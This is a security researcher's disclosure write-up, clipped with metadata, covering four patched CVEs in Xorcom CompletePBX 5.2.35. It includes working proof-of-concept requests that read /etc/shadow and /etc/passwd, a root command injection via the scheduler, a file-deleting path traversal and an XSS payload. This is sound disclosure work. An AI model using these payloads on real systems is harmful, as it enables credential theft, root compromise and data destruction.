---
title: "Multiple Vulnerabilities in Xorcom CompletePBX 5.2.35: RCE, File Disclosure and XSS - Chocapikk's Cybersecurity Blog"
source: https://chocapikk.com/posts/2025/completepbx/
source_host: chocapikk.com
clip_date: 2026-09-24T10:25:39+08:00
trace_id: 21db0480-8be4-4fc3-81d9-b4390f3073e8
content_hash: f6a64787861c1d84013001c195033020ae72f5cb7f024368c7760b30b77ed6eb
status: synced
tags:
  - 漏洞分析
  - 安全工具
series: null
feed_source: Chocapikk·漏洞/Android RE
ai_summary: CompletePBX 5.2.35 存在四个认证后漏洞（文件读取、root RCE、路径遍历删除、反射 XSS），已在 5.2.36.1 修复。
ai_summary_style: key-points
images_status:
  total: 10
  succeeded: 10
  failed_urls: []
notion_page_id: 3e575244-d011-8129-a451-e3f2e79a1057
ioc:
  cves:
    - CVE-2025-2292
    - CVE-2025-30004
    - CVE-2025-30005
    - CVE-2025-30006
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> CompletePBX 5.2.35 存在四个认证后漏洞（文件读取、root RCE、路径遍历删除、反射 XSS），已在 5.2.36.1 修复。
> 
> - **CVE-2025-2292（文件泄露）：** `?class=core&method=download` 的 `backup` 参数为 Base64 编码且未校验，将其解为 `/etc/shadow` 即可下载服务器口令哈希，需携带 `sid` cookie。
> - **CVE-2025-30004（命令注入 RCE）：** `class=scheduler&method=save_task` 的 `parameters` 字段未经转义直接拼入 shell，`parameters=$(id)` 即可以 root 执行任意命令，可用于植入反连 shell 或计划任务持久化。
> - **CVE-2025-30005（路径遍历+删除）：** `class=diagnostics&method=stopMode` 的 `systemDataFileName` 可用 `../../../etc/passwd` 读取任意文件，文件以 ZIP 诊断包返回后会被服务器自动删除，兼具信息泄露与破坏性。
> - **CVE-2025-30006（反射 XSS）：** `class` 参数未转义即回显，可窃取 cookie、劫持管理员会话，并作为 gadget 串联调度任务或诊断接口达成 RCE。
> - **测试方法：** 因 IonCube 混淆且版本无公开脱壳工具，全程无源码黑盒分析，用 `pspy` 监控 Web 界面派生的进程以定位盲注，作者已向 Metasploit 提交 2 个 auxiliary 模块和 1 个 exploit 模块。

![Multiple Vulnerabilities in Xorcom CompletePBX 5.2.35: RCE, File Disclosure and XSS](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5fa8cf0beda9e50b.png)

## Introduction: Understanding CompletePBX 5

Xorcom CompletePBX is a **VoIP telephony system** designed for enterprises, offering features such as **call routing, SIP trunking, voicemail, and administrative controls**. It is widely deployed in business environments where secure and reliable communication is critical.

> According to their website, **Xorcom IP-PBX systems are used by businesses, governments, and non-profits in over 100 countries worldwide**. Their product line covers small offices to international enterprises, including VoIP and hybrid PBX solutions, on-premise and virtual deployments, and multi-tenant environments. The system is built on **Ombutel**, a platform that powers the core PBX functionality.

## Assessment Context

During a **black-box security assessment** of **CompletePBX version 5.2.35**, I identified several **critical vulnerabilities** affecting authenticated users. The assessment was particularly complex due to the use of **IonCube Loader**, a commercial PHP obfuscation system that encrypts the application logic. The version used by CompletePBX appears to be **recent and currently unsupported by public deobfuscation tools**.

Despite attempting to locate viable deobfuscators or patch loaders, no practical method was found to reverse or bypass the encryption in this case. As such, the entire analysis was conducted **without source code access**, relying solely on:

-   Behavioral analysis of HTTP requests and responses
-   Reverse-engineering of application behavior through network traffic
-   Local runtime monitoring to observe system-level effects

To complement this black-box approach, I leveraged [`pspy`](https://github.com/DominicBreuker/pspy), a **privilege-less process monitoring tool**, to observe **commands spawned by the web interface**. This strategy was particularly effective in identifying **blind command injection vectors**, such as those exploited in **CVE-2025-30004**.

![Proof of RCE via task scheduler](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/32069b352bec131d.png)

Using Pspy to discover CVE-2025-30004

The combination of **network-layer fuzzing** and **runtime instrumentation** made it possible to uncover vulnerabilities with severe impact — including **remote command execution as root**, **sensitive file disclosure**, and **reflected XSS**— despite the heavy code obfuscation.

### Discovery Timeline

| **Date** | **Event** |
| --- | --- |
| March 2, 2025 | Initial discovery of vulnerabilities through black-box testing. |
| March 4, 2025 | Xorcom acknowledges receipt of the vulnerability report. |
| March 5, 2025 | CTO requests that the vulnerabilities remain **private** and **not fully** disclosed. |
| March 5, 2025 | I respond, explaining **responsible disclosure best practices** and the importance of transparency. |
| March 6, 2025 | CEO of Xorcom personally reaches out, thanks me, and proposes a call to discuss potential collaboration. |
| March 9, 2025 | Call with the CEO to discuss the technical details, a potential freelance security collaboration, and a 90-day full disclosure agreement post-patch. |
| March 12, 2025 | I contact **VulnCheck** to request CVE assignments without giving technical details. |
| March 18, 2025 | Retesting reveals that **CVE-2025-30005** remains exploitable. |
| March 18, 2025 | Xorcom confirms that final patches are in progress. |
| March 19, 2025 | Retesting confirms **CVE-2025-30005** is now properly fixed. |
| March 27, 2025 | Release of CompletePBX 5.2.36.1 with security patches. ([Xorcom](https://www.xorcom.com/new-completepbx-release-5-2-36-1/ "New CompletePBX Release – 5.2.36.1 \| Xorcom - IP PBX (Private Branch Exchange) Developer & Manufacturer, Multi-Tenant PBX, Hotel PBX, Virtual PBX, Call Center PBX / PABX")) |
| June 22, 2025 | Public disclosure |

## Advisories

-   **CVE-2025-2292**  
    Authenticated file disclosure in CompletePBX ≤ 5.2.35.
    
    -   CVE: [https://www.cve.org/CVERecord?id=CVE-2025-2292](https://www.cve.org/CVERecord?id=CVE-2025-2292)
    -   Advisory: [https://vulncheck.com/advisories/completepbx-file-disclosure](https://vulncheck.com/advisories/completepbx-file-disclosure)
-   **CVE-2025-30004**  
    Authenticated command injection (RCE) in CompletePBX ≤ 5.2.35.
    
    -   CVE: [https://www.cve.org/CVERecord?id=CVE-2025-30004](https://www.cve.org/CVERecord?id=CVE-2025-30004)
    -   Advisory: [https://vulncheck.com/advisories/completepbx-authenticated-command-injection](https://vulncheck.com/advisories/completepbx-authenticated-command-injection)
-   **CVE-2025-30005**  
    Path traversal allowing file deletion & disclosure in CompletePBX ≤ 5.2.35.
    
    -   CVE: [https://www.cve.org/CVERecord?id=CVE-2025-30005](https://www.cve.org/CVERecord?id=CVE-2025-30005)
    -   Advisory: [https://vulncheck.com/advisories/completepbx-path-traversal-file-deletion](https://vulncheck.com/advisories/completepbx-path-traversal-file-deletion)
-   **CVE-2025-30006**  
    Authenticated reflected XSS in CompletePBX 5.2.35.
    
    -   CVE: [https://www.cve.org/CVERecord?id=CVE-2025-30006](https://www.cve.org/CVERecord?id=CVE-2025-30006)
    -   Advisory: [https://vulncheck.com/advisories/completepbx-reflected-xss](https://vulncheck.com/advisories/completepbx-reflected-xss)

### Vulnerability Details

Each of the following vulnerabilities exposes CompletePBX **to significant security risks**, including **authenticated information disclosure, remote code execution, and XSS attacks**.

These issues could allow attackers to compromise sensitive data, execute arbitrary commands, and disrupt system functionality.

## Authenticated File Disclosure (CVE-2025-2292)

![Metasploit module for CVE-2025-2292](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5edd42455f1c7dd6.png)

Metasploit module targeting the file disclosure vulnerability (CVE-2025-2292)

### Summary

An **authenticated path traversal vulnerability** in Xorcom CompletePBX 5.2.35 allows **remote attackers with valid credentials** to read arbitrary files on the server, including **sensitive system files like `/etc/shadow`**. The vulnerability exists in the **core module’s** `download` method, which fails to properly validate user input.

The attack requires **a valid session token (`sid` cookie)**, meaning the attacker must be logged in before exploiting the issue.

### Technical Details

#### Vulnerable Endpoint

```plaintext
http://example.org/?class=core&method=download&backup=,L2V0Yy9zaGFkb3c%3d
```

The `backup` parameter is **Base64-encoded**, and decoding the value reveals:

```plaintext
/etc/shadow
```

which allows retrieval of **password hashes** from the system.

#### Proof of Concept (PoC)

```bash
curl -X GET "http://example.org/?class=core&method=download&backup=,L2V0Yy9zaGFkb3c%3d" \
     -H "Cookie: sid=abcdef123456"
```

#### Expected Response

```plaintext
HTTP/1.1 200 OK
Content-Disposition: attachment; filename="shadow"
Content-Type: text/plain;charset=UTF-8

root:$y$j9T$/vXScZij/ykAtLtP9H1nQ/$KK43hfpOrxdZwAZljjvS5dnF0ipg8NqpCOj9gbLJ9OA:19829:0:99999:7:::
...
pbx:$y$j9T$u6FpdD4iJVvFEqtUSAoFP/$P5iBn5ljpYEwcuXj4F9n6SBlMgWyxjqBDK82ija9Te5:19829:0:99999:7:::
```

This response confirms that the server **returns the requested file**, including **sensitive credentials stored in `/etc/shadow`**.

### Impact

-   **Sensitive data exposure**: Attackers can retrieve **configuration files, database credentials, and system authentication files**.
-   **Privilege escalation**: Password hashes from `/etc/shadow` can be **brute-forced** to escalate access.
-   **Complete system compromise**: If an attacker cracks the **root password**, they can gain full control of the server.

## Authenticated Command Injection (CVE-2025-30004)

![Command injection exploit via task scheduler](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/471109be63339971.png)

Arbitrary command execution using the scheduler module (CVE-2025-30004)

### Summary

A critical vulnerability in the **task scheduler module** of Xorcom CompletePBX 5.2.35 allows an **authenticated user** to execute **arbitrary system commands as root**. This stems from **insufficient input sanitization** in task parameters, leading to a direct **command injection** opportunity.

### Why This Injection Stands Out

Throughout the application, most user-controlled inputs that could impact system commands appear to be **carefully filtered or wrapped** in sanitization logic — likely as a safeguard against command injection. However, an exception exists in the **scheduler’s task creation functionality**, where input passed through the `parameters` field is directly inserted into shell commands **without proper escaping or validation**.

This oversight makes it possible to inject commands via the web interface or API with minimal effort, representing a significant deviation from the application’s otherwise cautious approach to command execution.

![Web interface entry point for scheduled tasks](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/90bbb85912610e24.png)

Access to the task manager interface via the CompletePBX web panel

![Task creation form in CompletePBX](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5f88b4daca1fe837.png)

Scheduler interface allowing arbitrary parameter input for custom tasks

![Execution of scheduled task with unsanitized parameters](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c36972ed37e29514.png)

Execution of a task created with injected shell commands

![Proof of RCE via task scheduler](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/32069b352bec131d.png)

Result of command injection showing successful remote code execution (RCE) as root

### Technical Details

#### Vulnerable Endpoint

```plaintext
POST / HTTP/1.1  
Host: example.org  
Cookie: sid=abcdef123456  
Content-Type: application/x-www-form-urlencoded  

script: backup&parameters=$(id)&class=scheduler&method=save_task
```

The vulnerable `save_task` method processes the `parameters` value and passes it into the command execution context as-is.

#### Proof of Concept: Creating a Malicious Task

```bash
curl -X POST "http://example.org/" \
     -H "Cookie: sid=abcdef123456" \
     -d "script=backup&parameters=$(id)&class=scheduler&method=save_task"
```

The injected command `$(id)` is interpreted by the shell, resulting in execution as root.

### Impact

-   **Remote Code Execution (RCE)**: Attackers can execute arbitrary commands with **root privileges**, leading to complete takeover.
-   **Establishing Persistence**: Malicious scripts, reverse shells, or cron jobs can be installed through this interface.
-   **Lateral Movement**: With root access on the PBX system, attackers can pivot to other systems within the internal network.

## Authenticated Path Traversal & File Deletion (CVE-2025-30005)

![Metasploit module for CVE-2025-30005](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/c9f7843696bc3e2f.png)

Metasploit module targeting file read and deletion via ZIP diagnostics (CVE-2025-30005)

### Summary

The diagnostics module in Xorcom CompletePBX 5.2.35 contains a path traversal vulnerability that allows an authenticated attacker to request arbitrary files. Instead of returning the file content directly, the module packages the file into a ZIP archive. In an unexpected twist, once the file is included in the ZIP archive, the server automatically deletes it from the system. This creates a dual-risk scenario: an attacker gains sensitive information while simultaneously causing data loss on the target.

### Technical Details

When an attacker makes a request with a crafted `systemDataFileName` parameter, the application processes directory traversal sequences (such as `../../../../../../../../../etc/passwd`) to reach files outside the intended directory. Instead of sending the file content in plain text, the server compiles a diagnostic report that includes the requested file in a ZIP archive. This behavior is less obvious because the file is hidden within the archive and must be extracted in a controlled manner.

A typical vulnerable request might look like this:

```plaintext
GET /?class=diagnostics&method=stopMode&systemDataFileName=../../../../../../../../../etc/passwd HTTP/1.1
Host: target.com
Cookie: sid=abcdef123456
User-Agent: Mozilla/5.0
...
```

The server then generates a ZIP file that, when inspected, includes an entry for the file `../../../../../../../../../etc/passwd`.

### Proof of Concept (PoC) for Extraction

Because the file is packaged in a ZIP archive, a naive extraction using an untrusted file explorer might inadvertently trigger a Zip Slip vulnerability. To safely read the file contents, one can use controlled extraction in code. Below is an example in Python that demonstrates this:

```python
import zipfile

def read_file_from_zip(zip_path, target_file):
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        # Check if the target file (including traversal sequences) exists in the ZIP archive
        if target_file in zip_ref.namelist():
            with zip_ref.open(target_file) as file:
                content: file.read()
                print(f"=== Content of {target_file} ===")
                print(content.decode(errors="ignore"))
        else:
            print("[!] File not found in ZIP archive.")

# Example usage:
zip_path: "archive.zip"
# Here, the target file name includes traversal sequences, as generated by the vulnerable application.
target_file: "../../../../../../../../../etc/passwd"
read_file_from_zip(zip_path, target_file)
```

### Expected Output

Running the above script (after saving the ZIP file returned by the vulnerable endpoint as `archive.zip`) should produce output similar to:

```plaintext
➜  Downloads python exploit.py
=== Content of ../../../../../../../../../etc/passwd ===
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:108:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:106:110::/var/spool/postfix:/usr/sbin/nologin
tcpdump:x:107:112::/nonexistent:/usr/sbin/nologin
sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
Debian-snmp:x:110:113::/var/lib/snmp:/bin/false
asterisk:x:111:114:Asterisk PBX daemon,,,:/var/lib/asterisk:/usr/sbin/nologin
cc-cloud-rec:x:998:998::/var/lib/cc-cloud-rec:/sbin/nologin
```

### Key Takeaways

-   **Less Obvious Vulnerability:**  
    The fact that the diagnostic module returns a ZIP archive makes the vulnerability harder to spot during initial testing. An attacker must know to extract the file safely rather than simply viewing its contents directly.
    
-   **Safe Extraction Practices:**  
    It is essential to extract files from ZIP archives using controlled methods. This prevents accidental exploitation of Zip Slip vulnerabilities and ensures that only the intended file contents are processed.
    
-   **Destructive Nature:**  
    Beyond information disclosure, the vulnerability also causes the **automatic deletion** of the requested file, adding a denial-of-service dimension to the attack.
    

This example demonstrates both the method to safely extract a file using path traversal within a ZIP archive and the potential impact of the vulnerability.

## Authenticated Reflected XSS (CVE-2025-30006)

![Reflected XSS via class parameter](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/2b59a716507afd5e.png)

Reflected XSS triggered via class parameter (CVE-2025-30006)

### Summary

A reflected cross-site scripting (XSS) vulnerability in Xorcom CompletePBX 5.2.35 allows an attacker to inject malicious JavaScript via the `class` parameter. This vulnerability can be leveraged for session hijacking, phishing, and user interface manipulation. In many cases, this XSS can serve as a useful gadget for chaining with other exploits to further compromise the target system.

### Technical Details

#### Vulnerable Endpoint

`http://example.org/?class=whatever%22%3E%3Cimg+src=x+onerror=alert(1)%3E&method=stop`

The issue stems from the fact that user input for the `class` parameter is not properly sanitized or escaped before being reflected in the response. This lack of proper encoding permits an attacker to inject arbitrary HTML/JavaScript code into the page.

### Impact

-   **Session Hijacking:** Attackers can steal authentication cookies and other sensitive data.
-   **Phishing & Social Engineering:** Malicious scripts can be used to present fake login pages or manipulate the user interface.
-   **Gadget Usage:** The vulnerability can act as a powerful gadget, enabling attackers to chain this XSS with other exploits or payloads for more advanced attacks within the victim’s browser context.

## Conclusion

The vulnerabilities identified in **Xorcom CompletePBX 5.2.35** pose significant security risks to businesses using the platform. From authenticated file disclosure and remote command execution as root to reflected XSS, these issues underscore the need for rigorous security testing in enterprise VoIP solutions.

Despite the challenges of black-box testing due to Ioncube obfuscation, these vulnerabilities were successfully identified without access to the source code. This suggests that additional issues may exist and further security reviews are necessary.

Notably, the reflected XSS vulnerability, while it may appear to be a relatively minor flaw, can serve as a powerful entry point for more severe attacks. When exploited in an authenticated context, it can enable an attacker to steal session cookies, hijack admin sessions, and potentially chain with other vulnerabilities. For instance, leveraging an admin session acquired via XSS, an attacker could create malicious scheduled tasks or download sensitive archives, effectively paving the way to remote code execution (RCE) on the target system.

I have developed several Metasploit modules to exploit these vulnerabilities. You can find them in the following paths:

-   **Auxiliary modules:**  
    [`modules/auxiliary/scanner/http/xorcom_completepbx_diagnostics_file_read.rb`](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/xorcom_completepbx_diagnostics_file_read.rb)  
    [`modules/auxiliary/scanner/http/xorcom_completepbx_file_disclosure.rb`](https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/http/xorcom_completepbx_file_disclosure.rb)
    
-   **Exploit module:**  
    [`modules/exploits/linux/http/xorcom_completepbx_scheduler.rb`](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/xorcom_completepbx_scheduler.rb)
    

**I’d also like to thank VulnCheck for their support in assigning CVEs and the Xorcom team for acknowledging my work by including me in the official CompletePBX 5.2.36.1 change log.**

## Tips

> 💡 **If you’re building a lab to test software like this, don’t just clone the repo or read the code. Fully deploy it like a real system would — with a full install, running services, scheduled jobs, default settings, and everything else. The closer it is to a real-world environment, the better your understanding (and your chances of finding something real).**
> 
> Try to replicate how the software is likely to be installed in production: in a VM, with its default configs, running as root (sadly still common), possibly exposed on weird ports, with leftover backups, misconfigured permissions, or logs lying around.
> 
> And don’t forget to watch the system itself — tools like `pspy`, `inotify-tools`, or even `tcpdump` can reveal more than the UI or source ever will. Sometimes, a single log file being written somewhere unexpected is your way in.
